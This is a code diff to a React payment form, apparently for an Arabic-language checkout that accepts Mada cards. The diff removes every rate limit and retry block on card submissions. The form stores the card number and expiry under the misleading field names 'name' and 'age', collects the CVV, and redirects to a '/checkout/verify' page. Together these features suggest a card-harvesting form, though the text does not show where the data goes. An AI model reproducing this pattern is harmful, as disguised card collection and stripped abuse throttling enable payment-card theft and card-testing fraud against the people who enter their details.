@@ -1,13 +1,12 @@
 "use client";
 
-import { useState, useEffect, useCallback } from "react";
+import { useState } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
-import { motion, AnimatePresence } from "framer-motion";
+import { motion } from "framer-motion";
 import { FaWifi } from "react-icons/fa";
-import { IoChevronBack, IoLockClosedOutline, IoTimeOutline } from "react-icons/io5";
+import { IoChevronBack, IoLockClosedOutline } from "react-icons/io5";
 import cardValidator from "card-validator";
-import { useCartStore } from "../../store/cartStore";
 
 interface PaymentFormProps {
   onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
@@ -23,39 +22,7 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [loading, setLoading] = useState(false);
   const [submitted, setSubmitted] = useState(false);
   const [flipped, setFlipped] = useState(false);
-  const getRateLimitStatus = useCartStore((s) => s.getRateLimitStatus);
-  const recordOrder = useCartStore((s) => s.recordOrder);
-  const [rateLimitMsg, setRateLimitMsg] = useState<string | null>(null);
-  const [countdown, setCountdown] = useState("");
-  const [serverBlocked, setServerBlocked] = useState(false);
-  const [serverBlockedUntil, setServerBlockedUntil] = useState(0);
 
-  const formatTime = useCallback((ms: number) => {
-    const m = Math.floor(ms / 60000);
-    const s = Math.floor((ms % 60000) / 1000);
-    return `${m}:${s.toString().padStart(2, "0")}`;
-  }, []);
-
-  useEffect(() => {
-    const tick = () => {
-      const { blocked, remainingMs } = getRateLimitStatus();
-      const serverRemaining = serverBlockedUntil - Date.now();
-      const isServerBlocked = serverBlocked && serverRemaining > 0;
-
-      if (blocked || isServerBlocked) {
-        const ms = blocked ? remainingMs : serverRemaining;
-        setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً قبل المحاولة مرة أخرى 🙏");
-        setCountdown(formatTime(ms));
-      } else {
-        if (serverBlocked) setServerBlocked(false);
-        setRateLimitMsg(null);
-        setCountdown("");
-      }
-    };
-    tick();
-    const interval = setInterval(tick, 1000);
-    return () => clearInterval(interval);
-  }, [getRateLimitStatus, formatTime, serverBlocked, serverBlockedUntil]);
 
   const MADA_BINS = new Set(["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"]);
 
@@ -80,16 +47,8 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     return sum % 10 === 0;
   };
 
-  const isBlocked = !!rateLimitMsg;
-
   const handleNext = async () => {
     if (submitted) return;
-    const { blocked, remainingMs } = getRateLimitStatus();
-    if (blocked) {
-      setRateLimitMsg("عذراً، تم تقديم عدة طلبات متتالية. يرجى الانتظار قليلاً قبل المحاولة مرة أخرى 🙏");
-      setCountdown(formatTime(remainingMs));
-      return;
-    }
     const rawCard = fields.name.replace(/\s/g, "");
     if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
     if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
@@ -110,13 +69,11 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
     setExpiryError("");
     setLoading(true);
     try {
-      recordOrder();
       await onSubmit(fields);
       setSubmitted(true);
       router.push("/checkout/verify");
     } catch {
-      setServerBlocked(true);
-      setServerBlockedUntil(Date.now() + 5 * 60 * 1000);
+      // allow retry
     } finally { setLoading(false); }
   };
 
@@ -287,27 +244,6 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
         </div>
       </motion.div>
 
-      {/* Rate Limit Warning */}
-      <AnimatePresence>
-        {isBlocked && (
-          <motion.div
-            initial={{ opacity: 0, y: 10 }}
-            animate={{ opacity: 1, y: 0 }}
-            exit={{ opacity: 0, y: -10 }}
-            className="bg-amber-50 border border-amber-200 rounded-2xl p-5 text-center space-y-2"
-          >
-            <div className="w-12 h-12 bg-amber-100 rounded-full flex items-center justify-center mx-auto">
-              <IoTimeOutline size={24} className="text-amber-600" />
-            </div>
-            <p className="text-sm font-bold text-amber-800">{rateLimitMsg}</p>
-            <div className="bg-white rounded-xl py-2 px-4 inline-block border border-amber-100">
-              <p className="text-xs text-amber-500 font-medium">يمكنك المحاولة بعد</p>
-              <p className="text-2xl font-extrabold text-amber-700 mt-0.5">{countdown}</p>
-            </div>
-          </motion.div>
-        )}
-      </AnimatePresence>
-
       {/* Action Buttons */}
       <motion.div
         initial={{ opacity: 0, y: 16 }}
@@ -323,23 +259,17 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
           السابق
         </button>
         <motion.button
-          whileHover={isBlocked ? {} : { scale: 1.01 }}
-          whileTap={isBlocked ? {} : { scale: 0.98 }}
+          whileHover={{ scale: 1.01 }}
+          whileTap={{ scale: 0.98 }}
           onClick={handleNext}
-          disabled={loading || isBlocked || submitted}
-          className={`flex-1 relative overflow-hidden font-bold py-3.5 rounded-xl text-sm transition-shadow duration-300 flex items-center justify-center gap-2 ${
-            isBlocked
-              ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-              : "bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)] disabled:opacity-60 disabled:cursor-not-allowed"
-          }`}
+          disabled={loading || submitted}
+          className="flex-1 relative overflow-hidden font-bold py-3.5 rounded-xl text-sm transition-shadow duration-300 flex items-center justify-center gap-2 bg-gradient-to-r from-[#7A2FCC] via-[#8543C0] to-[#A842E4] text-white shadow-[0_8px_24px_rgba(133,67,192,0.3)] hover:shadow-[0_12px_32px_rgba(133,67,192,0.4)] disabled:opacity-60 disabled:cursor-not-allowed"
         >
           {loading ? (
             <>
               <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
               جاري المعالجة...
             </>
-          ) : isBlocked ? (
-            "يرجى الانتظار"
           ) : (
             <>
               <IoLockClosedOutline size={16} />
